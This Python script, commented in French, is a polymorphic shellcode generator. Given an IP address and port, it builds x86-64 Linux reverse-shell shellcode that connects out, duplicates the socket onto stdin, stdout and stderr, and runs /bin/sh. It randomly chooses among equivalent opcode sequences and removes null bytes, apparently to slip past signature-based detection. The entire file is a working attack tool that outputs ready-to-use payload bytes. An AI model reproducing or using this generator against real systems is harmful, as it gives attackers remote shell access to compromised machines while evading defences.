
import sys
import random

shellcode = ""

# argument ip and port
if len(sys.argv) != 3:
    print("usage : IP[10.x.x.x] Port[1-65535]")
    exit(1)
else:
    ipv4 = sys.argv[1]
    port = sys.argv[2]

#ip valide
def is_valid_ip(ip):
    splt = ip.split('.')
    
    if len(splt) != 4:
        sys.exit("L'adresse IPv4 doit etre composer de 32 bit dont chaque partie sera egale a 8 bit donc 1 octet")
    
    for part in splt:
        if not part.isdigit() or not 0 <= int(part) <= 255:
            sys.exit("Erreur : Adresse IP invalide.")

    return True

def port_is_valid(port):
    try :
        port = int(port)
        if not 0 <= port <= 65535:
            raise ValueError
    except ValueError:
        sys.exit("Le port doit être un entier compris entre 0 et 65535.")

#convert ip to hex
def ip_to_hex(ip):
    if is_valid_ip(ip):
        hex_partie = [format(int(byte), '02X') for byte in ip.split('.')] #zfill permet de garantir garantir que chaque partie hexadécimale convertie d'une adresse IP a une longueur de deux caractères
        return ''.join(hex_partie)
    return None

#convert port to hex
def port_to_hex(port):
    port = int(port)
    port_is_valid(port)
    port_hex = format(port, '04X')
    return port_hex

def ip_to_integer(ip):
    """Convert an IP address from string to a 32-bit integer."""
    parts = map(int, ip.split('.'))
    return sum(part << (8 * i) for i, part in enumerate(reversed(list(parts))))

def avoid_null_bytes(ip_integer):
    base_addition = 0x01010101
    while True:
        if b'\x00' not in (ip_integer + base_addition).to_bytes(4, 'big'):
            return base_addition
        base_addition += 0x01010101

def prepare_ip(ip):
    ip_integer = ip_to_integer(ip)
    base_addition = avoid_null_bytes(ip_integer)
    mov_value = ip_integer + base_addition
    sub_value = base_addition
    return f"{mov_value:08X}", f"{sub_value:08X}"



print(ip_to_hex(ipv4))
print(port_to_hex(port))

port_hex = port_to_hex(port)

def shellcodefinaly(s):
    shellcode = 'X'
    shellcode += 'X'.join(a+b for a,b in zip(s[::2],s[1::2])) #À chaque itération, a est un élément de s[::2] et b est l'élément correspondant de s[1::2]. La chaîne a+b combine ces deux éléments en une seule chaîne
    shellcode = shellcode.replace('X', '\\x')
    shellcode = shellcode.lower()
    print(shellcode, "\n") 



# Définition du dictionnaire contenant les clés et les listes de valeurs
### Nettoyage de registre ###
#xor rax,rax -> 48 31 c0
netoyage_registe1 = ["4831C0"]
shellcode+=random.choice(netoyage_registe1)
#xor rbx,rbx -> 48 31 db
netoyage_registe2 = ["4831DB"]
shellcode+=random.choice(netoyage_registe2)
#xor rcx,rcx -> ['48 31 c9']
netoyage_registe3 = ["4831C9"]
shellcode+=random.choice(netoyage_registe3)
#xor rdi,rdi -> ['48 31 ff']
#xor r8, r8 - mov rdi, r8 -> ["4D31C04C89C7"]
netoyage_registe4 = ["4831FF", "4D31C04C89C7"]
shellcode+=random.choice(netoyage_registe4)
#xor rsi,rsi -> ['48 31 f6']
netoyage_registe5 = ["4831F6"]
shellcode+=random.choice(netoyage_registe5)
#xor rdx,rdx -> ['48 31 d2']
##xor r8, r8 - mov rdx, r8 -> 4D31C04C89C2
netoyage_registe6 = ["4831D2","4D31C04C89C2"]
shellcode+=random.choice(netoyage_registe6)
####Creation Socket 41	socket #### 
#mov al,0x29 : ['b0 29']
#---
#0:  b0 28                   mov    al,0x28
#1:  04 01                   add    al,0x1
#---
#0:  b0 1e                   mov    al,0x1e
#2:  04 0b                   add    al,0xb
creation_socket1 = ["B0280401", "B029", "B01E040B"]
shellcode+=random.choice(creation_socket1)
#registre deja nettoyer donc on peut ce permettre
#2 à destination finale de RDI, pour AF_INTET (ipv4)
#--
#mov bl,0x2  : ['b3 02']
#mov rdi,rbx : ['48 89 df']
#--
#add rdi, 2 -> 4883C702
#--
#mov dil, 2 -> 40B702
#--
#mov dil, 3 - sub dil, 1 -> 40B7034080EF01
creation_socket2 = ["b3024889DF", "4883C702", "40B702","40B7034080EF01"]
shellcode+=random.choice(creation_socket2)

#1 à destination finale de RSI, pour SOCK_STREAM (TCP)
#mov bl, 1 : ['b3 01']
#mov rsi,rbx : ['48 89 de']
#--
#add rsi, 1 -> 4883C601
#---
#mov sil, 1 -> 40B601
#---
# mov sil, 2 - sub sil, 1 -> 40B6024080EE01 
creation_socket3 = ["B3014889DE","4883C601", "40B601", "40B6024080EE01"]
shellcode += random.choice(creation_socket3)

#'syscall' -> 0F05
creation_socket_syscall = ["0F05"]
shellcode += random.choice(creation_socket_syscall)

#recuperation du fD

#'mov rdi,rax' : ['48 89 c7'],
#'mov r10,rax' : ['49 89 c2'],
creation_socket_fd = ["4889C74989C2"]
shellcode+=random.choice(creation_socket_fd)
#### Connexion socket ####
# xor rax,rax -> ['48 31 c0'],
# mov al,0x2a -> ['b0 2a']
#---
connexion_socket1 = ["4831C0B02A"]
shellcode+=random.choice(connexion_socket1)

#'xor rbx,rbx' : ['48 31 db']
#'push rbx'    : ['53']
connexion_socket2 = ["4831DB53"]
shellcode+=random.choice(connexion_socket2)

#
#'mov esi,0x20ffff80' : ['be 80 ff ff 20']
#'sub esi,0x10ffff01': ['81 ee 01 ff ff 10']
ipv4_hex = prepare_ip(ipv4)
if ipv4_hex:
    mov_value, sub_value = ipv4_hex
    shellcode += f"BE{mov_value}"  # BE est l'opcode pour 'mov esi, imm32'
    shellcode += f"81EE{sub_value}"  # 81EE est l'opcode pour 'sub esi, imm32'
else:
    print("Erreur lors de la préparation de l'IP")

#'push rsi'     : ['56']
connexion_socket3 = ["56"]
shellcode+=random.choice(connexion_socket3)


#pushw 0x1d23' : ['66 68 23 1d']

connexion_socket4 = ["6668"]
connexion_socket4.append(str(port_hex))  # Supposons que port soit une valeur hexadécimale du port
connexion_socket4 = ''.join(connexion_socket4)
shellcode += (connexion_socket4)
#pushw 0x2 -> ['66 6a 02']
connexion_socket5 = ["666A02"]
shellcode += random.choice(connexion_socket5)
#mov rsi,rsp -> ['48 89 e6']
connexion_socket6 = ["4889E6"]
shellcode+=random.choice(connexion_socket6)

#mov dl,0x18 -> ['b2 18']
#add rdx, 0x10
connexion_socket8 = ["B218","4883C210" ]
shellcode+=random.choice(connexion_socket8)
#syscall  -> ['0f 05']
connexion_socket9 = ["0F05"]
shellcode += random.choice(connexion_socket9)

 #dup2
#xor rax,rax  -> ['48 31 c0'] 
dup1 = ["4831C0"]
shellcode+= random.choice(dup1)
#xor rdx,rdx  -> ['48 31 d2']
dup2 = ["4831D2"]
shellcode+= random.choice(dup2)
#mov al,0x21 -> ['b0 21']
dup3 = ["B021"]
shellcode+=random.choice(dup3)
#mov rdi,r10 -> ['4c 89 d7']
dup4 = ["4C89D7"]
shellcode+=random.choice(dup4)
#xor rsi,rsi  -> ['48 31 f6']
dup5 = ["4831F6"]
shellcode+=random.choice(dup5)
#'syscall'      : ['0f 05']
callsystem1 = ["0F05"]
shellcode+=random.choice(callsystem1)

#xor rax,rax  : ['48 31 c0']
dup1bis = ["4831C0"]
shellcode+=random.choice(dup1bis)

#'xor rdx,rdx'  : ['48 31 d2']
dup2bis = ["4831D2"]
shellcode+=random.choice(dup2bis)

#mov al,0x21'  : ['b0 21']
dup3bis = ["B021"]
shellcode+=random.choice(dup3bis)

#mov rdi,r10  : ['4c 89 d7']
dup4bis = ["4C89D7"]
shellcode+=random.choice(dup4bis)
#inc rsi'      : ['48 ff c6']
dup5bis = ["48FFC6"]
shellcode+=random.choice(dup5bis)
#'syscall'      : ['0f 05']
callsystem2 = ["0F05"]
shellcode+=random.choice(callsystem2)

#'xor rax,rax'  : ['48 31 c0']
dup1bis1 = ["4831C0"]
shellcode+=random.choice(dup1bis1)

#'xor rdx,rdx'  : ['48 31 d2']
dup2bis1 = ["4831D2"]
shellcode+=random.choice(dup2bis1)

#mov al,0x21  : ['b0 21']
dup3bis1 = ["B021"]
shellcode+=random.choice(dup3bis1)
#'mov rdi,r10'  : ['4c 89 d7']
dup4bis1 = ["4C89D7"]
shellcode+=random.choice(dup4bis1)
#'inc rsi'      : ['48 ff c6']
dup5bis1 = ["48FFC6"]
shellcode+=random.choice(dup5bis1)
#'syscall'      : ['0f 05']
dup6bis1 = ["0F05"]
shellcode+=random.choice(dup6bis1)

# xor rax, rax - xor rdx, rdx -> 4831c04831d2 [Default]
# xor rdx, rdx - xor rax, rax -> 4831d24831c0
# mov rax, rdx - xor rax, rdx - xor rdx, rdx -> 4889d04831d04831d2

list_xor = ["4831C04831D2" , "4831D24831C0", "4889D04831D04831D2"]
shellcode += random.choice(list_xor)

#movabs rbx,0x68732f2f6e69622f' : ['48 bb 2f 62 69 6e 2f 2f 73 68']
# mov rbx, 0x68732f6e584d0a31 - add rbx, 0x111524fe ->  
list_binbash = ["48BB2F62696E2F2F7368", "48BB310A4D586E2F73684881C3FE241511"]
shellcode += random.choice(list_binbash)

#Constante pile
#'push rax'    :  ['50']
#'push rbx'    :  ['53'], 
#'mov rdi,rsp' :  ['48 89 e7']
#'push rax'    :  ['50'] 
#'push rdi'    :  ['57']
#'mov rsi,rsp' :  ['48 89 e6']

conststack = ["50534889E750574889E6"]
shellcode += random.choice(conststack)

# mov al, 0x3b -> B03B
# mov al, 0x3a - add al, 0x01 -> B03A0401

execve = ["B03B", "B03A0401"]
shellcode += random.choice(execve)

callsystem3 = ["0F05"]
shellcode += random.choice(callsystem3)

#'xor rdi,rdi' :  ['48 31 ff']
# xor rdi, rdi [Default] -> 4831FF
# xor r8, r8 - mov rdx, r8 -> 4D31C04C89C2
# mov dl, 1 - sub dl, 1 -> b20180ea01
xorsyscall = ["4831FF", "4D31C04C89C2","B20180EA01"]
shellcode += random.choice(xorsyscall)

#'xor rax,rax ' :  ['48 31 c0']
xorsyscall2 = ["4831FF"]
shellcode+=random.choice(xorsyscall2)
#'mov al,0x3c' :  ['b0 3c']
list_exit = ["B03C" ,"B0632C27", "B01E041E" ,"B23C4889D0"]
shellcode += random.choice(list_exit)
#appelle systeme
#syscall' :  ['0f 05']
const = ["0F05"]
shellcode+=random.choice(const)

shellcodefinaly(shellcode)